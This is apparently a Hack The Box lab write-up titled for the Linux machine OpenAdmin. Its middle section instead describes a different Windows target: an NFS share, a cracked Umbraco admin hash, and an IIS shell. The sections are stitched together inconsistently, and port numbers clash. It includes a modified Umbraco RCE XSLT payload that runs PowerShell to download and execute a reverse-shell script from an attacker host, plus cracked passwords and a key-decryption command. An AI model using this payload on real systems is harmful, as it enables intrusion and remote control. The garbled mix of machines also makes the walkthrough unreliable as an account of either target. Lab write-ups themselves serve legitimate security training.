# Openadmin - Linux

Difficulty: 2

## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

NSF - TCP 2049

NFS is super uncommon on HTB machines, and thus, its being open is definitely worth some attention. showmount will give the paths that can be mounted and who can mount them. In this case, it’s named **site_backups** and everyone can access:

```bash
┌──(kali㉿kali)-[~/hackthebox/remote]
└─$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

┌──(kali㉿kali)-[~/hackthebox/remote]
└─$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/
```

Poking around a bit, there’s an .**sdf** file in **/App_Data** called **Umbraco.sdf**. .sdf files are **standard database format** files. I don’t know a great way to parse these files, but strings shows some interesting results right at the top of the file:

Found hash for Administrator - admin@htb.local 

Cracked the hash → password → `baconandcheese`

Using an  RCE Exploit I found on exploit-db to gain a reverse shell

Modified the exploit a bit 

```python
.
.
.
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "IEX(IWR http://10.10.14.9:8000/rev.ps1 -UseBasicParsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180/";
.
.
.
```

gained an initial shell as IIS 

Found user.txt inside Public directory

## Privilege Escalation

![Untitled](Openadmin%20-%20Linux%20e78951e23b1443f9a3a22345ae61387e/Untitled.png)

Found the password to Jimmy's account and SSHed into it. with password `n1nj4W4rri0R!`

Started an SSH tunnel on port 53846 after linpeas scan revealed a running service on that port and then navigated to http://localhost:52846/

![Untitled](Openadmin%20-%20Linux%20e78951e23b1443f9a3a22345ae61387e/Untitled%201.png)

Logged in using the credentials present in /var/www/internal/index.php

found `Joanna's` id_rsa file

logged in as Joanna

Decrypt id_rsa file 

```bash
openssl rsa -in id_rsa -out id_rsa_unlocked
```

![Untitled](Openadmin%20-%20Linux%20e78951e23b1443f9a3a22345ae61387e/Untitled%202.png)